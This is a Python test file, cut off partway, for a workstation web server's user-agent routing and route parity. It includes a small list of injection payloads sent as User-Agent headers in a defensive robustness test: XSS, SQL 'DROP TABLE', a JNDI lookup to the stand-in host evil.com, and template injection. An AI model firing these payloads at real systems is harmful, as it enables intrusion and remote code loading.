"""
tests/test_challenger_m2p_2_concurrency_matrix.py — Milestone M2-P Empirical Challenge Suite.

Adversarial Verification Scope:
1. User-Agent Matrix Benchmark on GET /:
   - 60 Desktop User-Agents (Windows Chrome/Firefox/Edge, macOS Safari/Chrome, Linux, PyWebView/WebView2, CLI curl/Postman, bots).
     Verify 100% serve static/pc.html with HTTP 200.
   - 60 Mobile User-Agents (iOS Safari, Android Chrome, iPad Safari, Android Firefox, Mobile Opera, Samsung Internet, UC, Xiaomi).
     Verify 100% do not serve pc.html (fallback to mobile/index during transition).
   - Adversarial & Edge-Case UAs (missing, empty, whitespace, mixed-case, 65KB ReDoS stress, injection payloads).
   - Legacy hpwOS edge case documentation.
2. Explicit Route Parity Verification:
   - Assert exact parity between GET /pc and GET /pc.html (status 200, media_type text/html, identical body bytes).
   - Assert exact parity between GET /mobile and GET /mobile.html.
   - Assert strict 405 Method Not Allowed for prohibited methods (POST, PUT, DELETE, PATCH).
   - Assert complete absence of prohibited legacy clutter (QR codes, network toggles, device management tables, folder managers).
3. Telemetry & Credentials Concurrency Stress Testing:
   - Stress-test GET /api/workstation/credentials under 20 concurrent workers (mean latency < 10ms, 0 errors).
   - Stress-test GET /api/transfers under 20 concurrent workers (latency distribution & threadpool analysis).
   - Sequential vs Concurrent SLA comparison.
   - Interleaved concurrent traffic stress test.
   - Concurrency security checks: 20 concurrent remote probes to credentials (100% 403) and transfers (100% 401).
"""

from __future__ import annotations

import asyncio
import concurrent.futures
import html
import logging
import os
import re
import sys
import time
import unittest
from typing import Any, Dict, List, Tuple

import numpy as np
import httpx
from starlette.testclient import TestClient

# Suppress verbose HTTP logging during automated benchmark execution
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("httpx2").setLevel(logging.WARNING)
logging.getLogger("httpcore").setLevel(logging.WARNING)

# Ensure project root is in sys.path
PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

from core.auth import clear_all_sessions, create_session_token
from core.queue_manager import get_queue_manager
import server


# =============================================================================
# Curated 60 Desktop User-Agents Matrix
# =============================================================================
DESKTOP_USER_AGENTS = [
    # Windows Desktop Browsers
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.95 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Vivaldi/6.5.3206.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Brave/1.61.100",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",

    # macOS Desktop Browsers
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_7_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_7_10) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Vivaldi/6.5.3206.50",

    # Linux Desktop Browsers
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    "Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",

    # PyWebView / WebView2 / Workstation Desktop Wrappers
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; WebView2/120.0.0.0)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0 WebView2/4.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) pywebview/4.4.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AssetDrop-Workstation/3.0",
    "pywebview-client/1.0",

    # Automated & Headless Desktop Browsers
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/120.0.6099.109 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/121.0.6167.85 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Playwright/1.40.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Puppeteer/21.6.1",

    # HTTP & CLI Developer Clients
    "curl/7.88.1",
    "curl/8.4.0",
    "Wget/1.21.4",
    "PostmanRuntime/7.36.0",
    "HTTPie/3.2.1",
    "python-requests/2.31.0",
    "python-httpx/0.26.0",
    "aiohttp/3.9.1",
    "Go-http-client/1.1",
    "Go-http-client/2.0",

    # Desktop Search Engine & Inspection Crawlers
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com/duckduckbot.html)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
]


# =============================================================================
# Curated 60 Mobile User-Agents Matrix
# =============================================================================
MOBILE_USER_AGENTS = [
    # Apple iPhone (iOS Safari)
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.7 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.8 Mobile/15E148 Safari/604.1",

    # Apple iPhone (Alternative Browsers on iOS: Chrome, Firefox, Edge, Opera)
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.119 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/120.0 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/120.0.2210.91 Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/3.4.2 Mobile/15E148 Safari/604.1",

    # Apple iPad & iPod Touch
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.119 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/119.0 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (iPad; CPU OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.8 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPod touch; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.8 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPod; CPU iPhone OS 12_5_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Mobile/15E148 Safari/604.1",

    # Android Smartphones (Google Pixel Series)
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.115 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.193 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.111 Mobile Safari/537.36",

    # Android Smartphones (Samsung Galaxy Series & Samsung Internet)
    "Mozilla/5.0 (Linux; Android 14; SAMSUNG SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/115.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A528B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.36",

    # Android Smartphones (Xiaomi / Redmi / POCO & MIUI Browser)
    "Mozilla/5.0 (Linux; Android 14; 23127PN0CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; 2210132G Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 XiaoMi/MiuiBrowser/14.3.11-gn",
    "Mozilla/5.0 (Linux; Android 13; 2201116PG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; 2201117TY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.193 Mobile Safari/537.36",

    # Android Smartphones (OnePlus, Oppo, Vivo, Realme)
    "Mozilla/5.0 (Linux; Android 14; CPH2581) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; CPH2415) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; V2241A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; RMX3741) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",

    # Android Smartphones (Sony, Motorola, Asus)
    "Mozilla/5.0 (Linux; Android 13; XQ-DQ72) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; motorola edge 40 pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; ASUS_AI2205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",

    # Android Firefox Mobile
    "Mozilla/5.0 (Android 14; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0",
    "Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0",
    "Mozilla/5.0 (Android 13; Mobile; rv:119.0) Gecko/119.0 Firefox/119.0",
    "Mozilla/5.0 (Android 12; Mobile; rv:115.0) Gecko/115.0 Firefox/115.0",

    # Mobile Opera, Opera Touch & UC Browser
    "Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36 OPR/74.0.2254.71264",
    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 OPR/70.0.0.0",
    "Mozilla/5.0 (Linux; U; Android 12; en-US; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.4.0.1306 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 11; zh-CN; M2012K11AC) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.2.0.1280 Mobile Safari/537.36",

    # Android WebView (Embedded within Apps & Capacitor / Cordova)
    "Mozilla/5.0 (Linux; U; Android 14; en-us; Pixel 8 Build/UD1A.230803.041) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 13; en-us; SM-G998U1 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.144 Mobile Safari/537.36",

    # Android Tablets
    "Mozilla/5.0 (Linux; Android 13; SM-X900) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Lenovo TB-J606F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.111 Safari/537.36",
    "Mozilla/5.0 (Android 13; Tablet; rv:120.0) Gecko/120.0 Firefox/120.0",

    # Windows Phone & Mobile
    "Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 930) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537",
    "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254",
    "Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 1520) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537",

    # webOS Touch Platforms
    "Mozilla/5.0 (webOS/2.2.4; U; en-US) AppleWebKit/534.6 (KHTML, like Gecko) webOSBrowser/221.56 Safari/534.6 Pre/3.0",
    "Mozilla/5.0 (webOS/2.1.0; U; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Version/1.0 Safari/532.2 Pre/1.2",
    "Mozilla/5.0 (webOS/1.4.5; U; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Version/1.0 Safari/532.2 Pre/1.0",
]


class TestUserAgentMatrix(unittest.TestCase):
    """
    Empirical Matrix Testing on GET / across 60 Desktop and 60 Mobile User-Agents.
    """

    @classmethod
    def setUpClass(cls):
        clear_all_sessions()
        server.init_server_credentials(force_refresh=True)
        cls.client = TestClient(server.app)

    def test_01_desktop_user_agent_matrix_60_profiles(self):
        """
        Verify that 60 desktop User-Agents on GET / serve static/pc.html with HTTP 200.
        Assert that response contains pc.css, pc.js, workstation title, and NOT view-mobile.
        """
        failures: List[str] = []
        for idx, ua in enumerate(DESKTOP_USER_AGENTS):
            resp = self.client.get("/", headers={"User-Agent": ua})
            if resp.status_code != 200:
                failures.append(f"[{idx}] HTTP {resp.status_code} != 200 for UA: {ua}")
                continue

            content_type = resp.headers.get("content-type", "")
            if "text/html" not in content_type:
                failures.append(f"[{idx}] Content-Type '{content_type}' does not contain text/html for UA: {ua}")
                continue

            html_text = resp.text
            # Strict PC Interface markers
            if "/static/pc.css" not in html_text:
                failures.append(f"[{idx}] Missing '/static/pc.css' in response for UA: {ua}")
            if "AssetDrop Workstation // PC Hub" not in html_text:
                failures.append(f"[{idx}] Missing 'AssetDrop Workstation' title in response for UA: {ua}")
            if "pc-queue-table" not in html_text:
                failures.append(f"[{idx}] Missing 'pc-queue-table' in response for UA: {ua}")
            if "id=\"view-mobile\"" in html_text or "id='view-mobile'" in html_text:
                failures.append(f"[{idx}] Erroneously contained 'view-mobile' in response for UA: {ua}")

        self.assertEqual(len(failures), 0, f"Desktop UA Matrix encountered {len(failures)} failures:\n" + "\n".join(failures[:10]))
        print(f"\n[PASS] Verified 100% of {len(DESKTOP_USER_AGENTS)} Desktop User-Agents served static/pc.html with HTTP 200")

    def test_02_mobile_user_agent_matrix_60_profiles(self):
        """
        Verify that 60 mobile User-Agents on GET / DO NOT serve static/pc.html.
        Assert that response serves mobile interface / transition fallback with HTTP 200.
        """
        failures: List[str] = []
        for idx, ua in enumerate(MOBILE_USER_AGENTS):
            resp = self.client.get("/", headers={"User-Agent": ua})
            if resp.status_code != 200:
                failures.append(f"[{idx}] HTTP {resp.status_code} != 200 for UA: {ua}")
                continue

            content_type = resp.headers.get("content-type", "")
            if "text/html" not in content_type:
                failures.append(f"[{idx}] Content-Type '{content_type}' does not contain text/html for UA: {ua}")
                continue

            html_text = resp.text
            # Assert PC Interface is NOT served to mobile devices
            if "/static/pc.css" in html_text:
                failures.append(f"[{idx}] Erroneously served '/static/pc.css' to mobile UA: {ua}")
            if "AssetDrop Workstation // PC Hub" in html_text:
                failures.append(f"[{idx}] Erroneously served 'AssetDrop Workstation' title to mobile UA: {ua}")
            # Mobile view or transition fallback must be present
            if "view-mobile" not in html_text:
                failures.append(f"[{idx}] Missing 'view-mobile' fallback in response for UA: {ua}")

        self.assertEqual(len(failures), 0, f"Mobile UA Matrix encountered {len(failures)} failures:\n" + "\n".join(failures[:10]))
        print(f"[PASS] Verified 100% of {len(MOBILE_USER_AGENTS)} Mobile User-Agents avoided pc.html and received mobile interface with HTTP 200")

    def test_03_adversarial_user_agent_boundary_cases(self):
        """
        Test edge cases, missing headers, mixed-case strings, 65KB ReDoS payloads, and SQLi/XSS vectors.
        """
        # Case A: Missing User-Agent header entirely
        r_none = self.client.get("/")
        self.assertEqual(r_none.status_code, 200)
        self.assertIn("/static/pc.css", r_none.text, "Missing UA header should default to PC interface")

        # Case B: Empty string UA
        r_empty = self.client.get("/", headers={"User-Agent": ""})
        self.assertEqual(r_empty.status_code, 200)
        self.assertIn("/static/pc.css", r_empty.text, "Empty UA header should default to PC interface")

        # Case C: Whitespace-only UA
        r_ws = self.client.get("/", headers={"User-Agent": "   \t  \n  "})
        self.assertEqual(r_ws.status_code, 200)
        self.assertIn("/static/pc.css", r_ws.text, "Whitespace UA header should default to PC interface")

        # Case D: Mixed case mobile keywords
        r_mc1 = self.client.get("/", headers={"User-Agent": "Mozilla/5.0 (aNdRoId 14; Mobile)"})
        self.assertEqual(r_mc1.status_code, 200)
        self.assertNotIn("/static/pc.css", r_mc1.text, "Case-insensitive 'aNdRoId' should trigger mobile interface")

        r_mc2 = self.client.get("/", headers={"User-Agent": "Mozilla/5.0 (iPhOnE; CPU OS 17_0)"})
        self.assertEqual(r_mc2.status_code, 200)
        self.assertNotIn("/static/pc.css", r_mc2.text, "Case-insensitive 'iPhOnE' should trigger mobile interface")

        r_mc3 = self.client.get("/", headers={"User-Agent": "Mozilla/5.0 (wEbOs 2.0; Mobile)"})
        self.assertEqual(r_mc3.status_code, 200)
        self.assertNotIn("/static/pc.css", r_mc3.text, "Case-insensitive 'wEbOs' should trigger mobile interface")

        # Case E: ReDoS stress test (65KB string)
        huge_desktop_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " + ("A" * 65000)
        t0 = time.perf_counter()
        r_huge = self.client.get("/", headers={"User-Agent": huge_desktop_ua})
        elapsed_ms = (time.perf_counter() - t0) * 1000.0
        self.assertEqual(r_huge.status_code, 200)
        self.assertIn("/static/pc.css", r_huge.text)
        self.assertLess(elapsed_ms, 50.0, f"65KB UA ReDoS evaluation took {elapsed_ms:.2f}ms (threshold 50ms)")

        huge_mobile_ua = ("X" * 65000) + " Android"
        t0 = time.perf_counter()
        r_huge_mob = self.client.get("/", headers={"User-Agent": huge_mobile_ua})
        elapsed_mob_ms = (time.perf_counter() - t0) * 1000.0
        self.assertEqual(r_huge_mob.status_code, 200)
        self.assertNotIn("/static/pc.css", r_huge_mob.text)
        self.assertLess(elapsed_mob_ms, 50.0, f"65KB mobile UA evaluation took {elapsed_mob_ms:.2f}ms")

        # Case F: Adversarial injection payloads in User-Agent header (ASCII / RFC 7230 compliant)
        injections = [
            "<script>alert(1)</script>",
            "'; DROP TABLE sessions; --",
            "\" OR 1=1 --",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "%F0%9F%9A%80%F0%9F%94%A5",
            "User-Agent: injected-header",
        ]
        for inj in injections:
            r_inj = self.client.get("/", headers={"User-Agent": inj})
            self.assertEqual(r_inj.status_code, 200, f"Adversarial UA '{inj}' crashed server with {r_inj.status_code}")

        print("[PASS] Verified all adversarial, edge-case, and ReDoS User-Agent boundary conditions")

    def test_04_hpwos_legacy_edge_case(self):
        """
        Document empirical observation: HP TouchPad legacy tablets report 'hpwOS/3.0.5'.
        Because server.py MOBILE_UA_REGEX searches 'webOS' rather than 'hpwOS|webOS',
        HP TouchPad defaults to the desktop interface static/pc.html.
        """
        hp_touchpad_ua = "Mozilla/5.0 (hp-tablet; Linux; hpwOS/3.0.5; U; en-US) AppleWebKit/534.6 (KHTML, like Gecko) wOSBrowser/234.83 Safari/534.6 TouchPad/1.0"
        resp = self.client.get("/", headers={"User-Agent": hp_touchpad_ua})
        self.assertEqual(resp.status_code, 200)
        # Empirical finding: HP TouchPad receives desktop interface
        is_classified_mobile = server.is_mobile_user_agent(hp_touchpad_ua)
        self.assertFalse(is_classified_mobile, "hpwOS is not covered by 'webOS' in MOBILE_UA_REGEX")
        print("[INFO] Documented empirical edge case: HP TouchPad (hpwOS) defaults to desktop interface")


class TestExplicitRouteParity(unittest.TestCase):
    """
    Empirical Verification of Route Parity (/pc vs /pc.html and /mobile vs /mobile.html).
    """

    @classmethod
    def setUpClass(cls):
        cls.client = TestClient(server.app)

    def test_01_pc_route_parity_and_content_identity(self):
        """
        Verify that GET /pc and GET /pc.html:
        1. Both return HTTP 200 OK.
        2. Both return Content-Type starting with text/html.
        3. Both return exact byte-for-byte identical response content.
        4. Both contain required PC interface sections (queue, history, credentials).
        5. Both strictly exclude prohibited elements (QR code images, network toggles, device tables, folder managers, paste box).
        """
        r_pc = self.client.get("/pc")
        r_pc_html = self.client.get("/pc.html")

        self.assertEqual(r_pc.status_code, 200, f"GET /pc returned {r_pc.status_code}")
        self.assertEqual(r_pc_html.status_code, 200, f"GET /pc.html returned {r_pc_html.status_code}")

        self.assertIn("text/html", r_pc.headers.get("content-type", ""))
        self.assertIn("text/html", r_pc_html.headers.get("content-type", ""))

        self.assertEqual(r_pc.content, r_pc_html.content, "Byte mismatch between GET /pc and GET /pc.html")
        self.assertEqual(r_pc.text, r_pc_html.text, "Text mismatch between GET /pc and GET /pc.html")

        html_text = r_pc.text

        # 4. Required minimal PC interface contracts
        required_elements = [
            "pc-queue-table",
            "ACTIVE DOWNLOAD QUEUE",
            "Media File / URL",
            "pc-history-table",
            "DOWNLOADED FILES HISTORY",
            "File Name",
            "Save Location",
            "Completion Time",
            "btn-toggle-credentials",
            "pc-uid-display",
            "pc-password-display",
            "/static/pc.css",
            "/static/pc.js",
        ]
        for req in required_elements:
            self.assertIn(req, html_text, f"Required PC element '{req}' missing from /pc")

        # 5. Strict negative sweep against prohibited clutter
        prohibited_elements = [
            "qr-code-img",
            "qr-loading",
            "btn-regenerate-qr",
            "btn-copy-lan-url",
            "btn-network-mode-public",
            "btn-network-mode-trusted",
            "devices-card",
            "devices-list-container",
